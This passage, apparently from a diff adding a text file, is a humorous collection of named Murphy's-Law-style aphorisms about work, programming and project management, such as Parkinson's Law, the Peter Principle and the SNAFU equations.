+    The man who can smile when things go wrong has thought of someone he can blame it on.
+
+NOLAN'S PLACEBO
+    An ounce of image is worth a pound of performance.
+
+OLIVER'S LAW OF LOCATION
+    No matter where you are, there you are.
+
+O'REILLY'S LAW OF THE KITCHEN
+    Cleanliness is next to impossible.
+
+OSBORN'S LAW
+    Variables won't, constants aren't.
+
+O'TOOLE'S COMMENTARY ON MURPHY'S LAW
+    Murphy was an optimist.
+
+PARKINSON'S LAW
+    Work expands to fill the time available for its completion.
+
+PARKINSON'S LAW, MODIFIED
+    The components you have will expand to fill the available space.
+
+PEER'S LAW
+    The solution to a problem changes the problem.
+
+PETER'S PRINCIPLE
+    In every hierarchy, each employee tends to rise to the level of his incompetence.
+
+THE LAW OF THE PERVERSITY OF NATURE
+    You cannot determine beforehand which side of the bread to butter.
+
+PUDDER'S LAW
+    Anything that begins well will end badly. (Note: The converse of Pudder's law is not true.)
+
+RHODE'S COROLLARY TO HOARE'S LAW
+    Inside every complex and unworkable program is a useful routine struggling to be free.
+
+ROBERT E. LEE'S TRUCE
+    Judgement comes from experience; experience comes from poor judgement.
+
+RUDIN'S LAW
+    In a crisis that forces a choice to be made among alternative courses of action, people tend to choose the worst possible course.
+
+RULE OF ACCURACY
+    When working toward the solution of a problem it always helps you to know the answer.
+
+RYAN'S LAW
+    Make three correct guesses consecutively and you will establish yourself as an expert.
+
+SATTINGER'S LAW
+    It works better if you plug it in.
+
+SAUSAGE PRINCIPLE
+    People who love sausage and respect the law should never watch either one being made.
+
+SHAW'S PRINCIPLE
+    Build a system that even a fool can use, and only a fool will want to use it.
+
+SNAFU EQUATIONS
+    1) Given any problem containing N equations, there will be N+1 unknowns.
+    2) An object or bit of information most needed will be least available.
+    3) Any device requiring service or adjustment will be least accessible.
+    4) Interchangeable devices won't.
+    5) In any human endeavor, once you have exhausted all possibilities and fail, there will be one solution, simple and obvious, highly visible to everyone else.
+    6) Badness comes in waves.
+
+STEWART'S LAW OF RETROACTION
+    It is easier to get forgiveness than permission.
+
+THOREAU'S THEORIES OF ADAPTATION
+    1) After months of training and you finally understand all of a program's commands, a revised version of the program arrives with an all-new command structure.
+    2) After designing a useful routine that gets around a familiar "bug" in the system, the system is revised, the "bug" taken away, and you're left with a useless routine.
+    3) Efforts in improving a program's "user friendliness" invariable lead to work in improving user's "computer literacy".
+    4) That's not a "bug", that's a feature!
+
+THYME'S LAW
+    Everything goes wrong at once.
+
+THE LAW OF THE TOO SOLID GOOF
+    In any collection of data, the figures that are obviously correct beyond all need of checking contain the errors.
+
+    Corollary 1: No one you ask for help will see the error either.
+
+    Corollary 2: Any nagging intruder, who stops by with unsought advice, will spot it immediately.
+
+UNNAMED LAW
+    If it happens, it must be possible.
+
+WEILER'S LAW
+    Nothing is impossible for the man who doesn't have to do the work.
+
+WEINBERG'S COROLLARY
+    An expert is a person who avoids the small errors while sweeping on to the grand fallacy.
+
+WEINBERG'S LAW
+    If builders built buildings the way programmers write programs, then the first woodpecker that came along would destroy civilization.
+
+WHITEHEAD'S LAW
+    The obvious answer is always overlooked.
+
+WILCOX'S LAW
+    A pat on the back is only a few centimeters from a kick in the pants.
+
+WOOD'S AXIOM
+    As soon as a still-to-be-finished computer task becomes a life-or-death situation, the power fails.
+
+WOODWARD'S LAW
+    A theory is better than its explanation.
+
+ZYMURGY'S FIRST LAW OF EVOLVING SYSTEM DYNAMICS
+    Once you open a can of worms, the only way to recan them is to use a larger can.
+
+LAWS OF PROJECT MANAGEMENT
+
+1. No major project is ever installed on time, within budgets, with the staff that started it.  Yours will not be the first.
+2. Projects progress quickly until they become 90 percent complete, then they remain at 90 percent complete forever.
+3. One advantage of fuzzy project objectives is that they let you avoid the embarrassment of estimating the corresponding costs.
+4. When things are going well, something will go wrong.
+   When things just can't get any worse, they will.
+   When things appear to be going better you have overlooked something.
+5. If project content is allowed to change freely, the rate of change will exceed the rate of progress.
+6. No system is ever completely debugged. Attempts to debug a system inevitably introduce new bugs that are even harder to find.
+7. A carelessly planned project will take three times longer to complete than expected; a carefully planned project will take only twice as long.
+8. Project teams detest progress reporting because it vividly manifests their lack of progress.
